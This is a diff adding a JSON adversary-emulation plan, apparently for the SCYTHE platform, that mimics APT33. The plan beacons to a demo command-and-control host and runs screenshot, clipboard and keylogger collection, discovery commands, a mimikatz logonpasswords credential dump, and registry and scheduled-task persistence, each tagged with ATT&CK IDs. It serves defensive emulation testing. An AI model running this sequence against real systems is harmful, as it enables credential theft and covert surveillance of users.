@@ -1,0 +1,330 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Community APT33 Threat, plus Registry Keys and Preparing for Persist.",
+        "display_name": "APT33 v2",
+        "name": "APT33 v2",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp number.scythedemo.com:443 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "printscr",
+                "request": "--load printscr",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "4346510a-3dad-4302-8572-2bcdc8bc2e2c",
+                "module": "printscr",
+                "request": "--window Desktop",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1113"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "whoami",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "module": "loader",
+                "module_to_load": "clipboard",
+                "request": "--load clipboard",
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "833ad3b4-679c-4078-8153-cf4d6f979b8b",
+                "module": "clipboard",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1115"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "module": "loader",
+                "module_to_load": "keylogger",
+                "request": "--load keylogger",
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "8085957f-b422-48cb-960b-1f077790299d",
+                "module": "keylogger",
+                "request": "--start",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1056"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "time": 10,
+                "type": "delay"
+            },
+            "10": {
+                "depends_on": "5a720284-cf76-4f68-a5ac-b6a4f027a156",
+                "module": "keylogger",
+                "request": "--current",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1056"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "5a720284-cf76-4f68-a5ac-b6a4f027a156",
+                "module": "keylogger",
+                "request": "--stop",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1056"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "module": "loader",
+                "module_to_load": "sysinfo",
+                "request": "--load sysinfo",
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "14ba9c44-45b7-4630-b252-ad578faaeba9",
+                "module": "sysinfo",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "module": "loader",
+                "module_to_load": "processes",
+                "request": "--load processes",
+                "type": "message"
+            },
+            "15": {
+                "depends_on": "62dc619d-529a-441f-87e4-89778eee9587",
+                "module": "processes",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1057"
+                ],
+                "type": "message"
+            },
+            "16": {
+                "module": "loader",
+                "module_to_load": "services",
+                "request": "--load services",
+                "type": "message"
+            },
+            "17": {
+                "depends_on": "b819526e-8a99-45b1-8aa0-d6578545cf2f",
+                "module": "services",
+                "request": "--all",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1007"
+                ],
+                "type": "message"
+            },
+            "18": {
+                "module": "loader",
+                "module_to_load": "arp",
+                "request": "--load arp",
+                "type": "message"
+            },
+            "19": {
+                "depends_on": "be0bf7fa-c7ae-4ea7-a929-a22c51df209e",
+                "module": "arp",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "20": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c dir %USERPROFILE%\\Documents",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "21": {
+                "module": "loader",
+                "module_to_load": "upsh",
+                "request": "--load upsh",
+                "type": "message"
+            },
+            "22": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct",
+                "type": "message"
+            },
+            "23": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Get-DnsClientServerAddress",
+                "type": "message"
+            },
+            "24": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net use",
+                "type": "message"
+            },
+            "25": {
+                "module": "loader",
+                "module_to_load": "mimikatz",
+                "request": "--load mimikatz",
+                "type": "message"
+            },
+            "26": {
+                "depends_on": "acc295cf-e232-4a4d-9210-1a6911beb4f8",
+                "module": "mimikatz",
+                "request": "--arglist sekurlsa::logonpasswords",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "27": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c dir C:\\",
+                "rtags": [
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "28": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG ADD HKEY_CURRENT_USER\\Software\\ExampleRegKey /v Example /d \"Example Data\"",
+                "rtags": [
+                    "att&ck-technique:T1547.001",
+                    "att&ck-technique:T1112"
+                ],
+                "type": "message"
+            },
+            "29": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG QUERY HKEY_CURRENT_USER\\Software\\ExampleRegKey",
+                "rtags": [
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "30": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG DELETE HKEY_CURRENT_USER\\Software\\ExampleRegKey /f",
+                "rtags": [
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "31": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c SCHTASKS /CREATE /SC DAILY /TN \"MyTasks\\Example Task\" /TR \"C:\\example_service.exe\" /ST 11:00",
+                "rtags": [
+                    "att&ck-technique:T1053",
+                    "att&ck-technique:T1053.005"
+                ],
+                "type": "message"
+            },
+            "32": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c SCHTASKS /QUERY /TN \"MyTasks\\Example Task\"",
+                "rtags": [
+                    "att&ck-technique:T1053",
+                    "att&ck-technique:T1053.005"
+                ],
+                "type": "message"
+            },
+            "33": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c SCHTASKS /DELETE /TN \"MyTasks\\Example Task\" /F",
+                "rtags": [
+                    "att&ck-technique:T1053",
+                    "att&ck-technique:T1053.005"
+                ],
+                "type": "message"
+            },
+            "34": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c hostname",
+                "rtags": [
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "35": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
